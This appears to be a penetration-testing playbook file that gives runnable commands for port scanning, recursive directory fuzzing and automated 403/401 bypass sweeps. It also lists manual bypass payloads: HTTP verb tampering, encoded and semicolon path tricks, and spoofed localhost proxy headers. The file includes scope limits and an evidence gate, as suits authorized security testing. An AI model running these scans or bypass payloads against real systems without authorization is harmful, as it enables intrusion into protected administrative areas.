---
name: perimeter-port-service-fuzz
description: External port scanning, directory fuzzing (feroxbuster/ffuf), and 403/401 restriction bypass testing.
playbook: web-security
---

# Perimeter Port & Directory Service Fuzzing

## Attack Vector Summary
Perimeter and administrative bypass testing involves identifying exposed auxiliary network services, unlinked directories, administrative portals, and defeating weak path-based authorization filters (`403 Forbidden` / `401 Unauthorized`).

## Tactical Heuristics & Step-by-Step Flow

### 1. External Port Scanning & Service Enumeration (R16)
Check for exposed auxiliary and administrative ports (e.g. 8080 Jenkins, 3000 Grafana, 5000 MLflow, 6006 TensorBoard, 9090 Prometheus):

```bash
# 1. Fast port discovery with rustscan (URL_ONLY / In-Scope host)
rustscan -a $(curl -s -I https://target.com | grep -i "^location:\|^host:" | head -1 | awk '{print $2}' | cut -d: -f1 | tr -d '\r') --range 1-10000 2>/dev/null | tee Recon/target_ports.txt

# 2. Or using Naabu + Nmap service banner grab
naabu -host target.com -p 80,443,8080,8443,3000,5000,6006,8000,9000,9090 2>/dev/null | \
  nmap -sV -sC -iL - -oN Recon/target_ports.txt
```
*(Scope note: Only scan if the IP belongs to the dedicated target host. For third-party shared CDNs like Cloudflare, skip port scanning).*

### 2. Recursive Directory & Endpoint Fuzzing (R17)
Run non-destructive recursive endpoint discovery with status code filtering using `feroxbuster` (preferred) or `ffuf`:

```bash
# 1. Feroxbuster (Recursive discovery + extension bruteforce + status filter)
feroxbuster -u https://target.com -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt,json -d 2 --filter-status 404,403 \
  -o Recon/target_ferox.txt 2>/dev/null

# 2. API endpoint scan
feroxbuster -u https://target.com/api -w /usr/share/wordlists/api_small.txt \
  -x json,xml -d 1 --filter-status 404,403,500 \
  -o Recon/target_api_ferox.txt 2>/dev/null

# 3. ffuf 2-Pass Wall Detection Alternative (filter recurring generic response size/lines)
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt \
  -fc 404,403 -fl 44 -t 50 -c 2>/dev/null | tee Recon/target_ffuf.txt
```

### 3. 403/401 Restriction Bypass Sweeps (R18)
Extract `403 Forbidden` / `401 Unauthorized` endpoints from fuzzing output and execute automated & manual bypass sweeps:

```bash
# Extract 403/401 endpoints
grep "403\|401" Recon/target_ferox.txt 2>/dev/null | awk '{print $2}' | sort -u > Recon/target_403_endpoints.txt

# Run gobypass403 for 40+ automated bypass techniques
gobypass403 -l Recon/target_403_endpoints.txt -t 30 2>/dev/null | tee Recon/target_403_bypasses.txt
```

#### Manual 403/401 Bypass Techniques:
```text
# 1. Method Overriding & Verb Tampering
GET /admin -> POST, PUT, PATCH, OPTIONS, HEAD, TRACE, CONNECT, INVENTED
Header: X-HTTP-Method-Override: PUT

# 2. Path & Extension Mutation Tricks
/admin/
//admin/
/./admin/
/admin/../admin/
/ADMIN/
/%2fadmin
/%252fadmin
/admin%00
/admin?%23bypass
/admin;.css
/admin;.html
/admin;.json

# 3. Header Injection (Internal Proxy Simulation)
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Original-URL: /admin
X-Rewrite-URL: /admin
Referer: https://target.com/admin
Host: localhost

# 4. Protocol & User-Agent Swaps
Protocol downgrade: HTTP/2 -> HTTP/1.1 or HTTP/1.0
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
```

## Empirical Disclosed Report Patterns & High-Risk Matrices
| Vector / Pattern | Mechanism | Empirical Pattern | Expected Evidence Marker |
|---|---|---|---|
| Proxy Header Internal Bypass | Reverse proxy trusts upstream client header | `X-Forwarded-For: 127.0.0.1` | `200 OK` on previously `403 Forbidden` admin page |
| Semicolon URL Parsing Trick | Web server strips `;` but application treats as path | `/admin;.css` or `/admin;` | `200 OK` exposing admin functionality |
| Verb Tampering | Auth policy only restricts `GET` method | `POST /admin/users` | Successful action execution without authentication |

## Evidence Collection & Validation Gate
- Capture both the baseline `403/401` response and the successful bypass response (`200 OK`).
- Document exact header or URL transformation required for reproduction.
- Evaluate against `/validate` 7-Question Validation Gate before reporting.
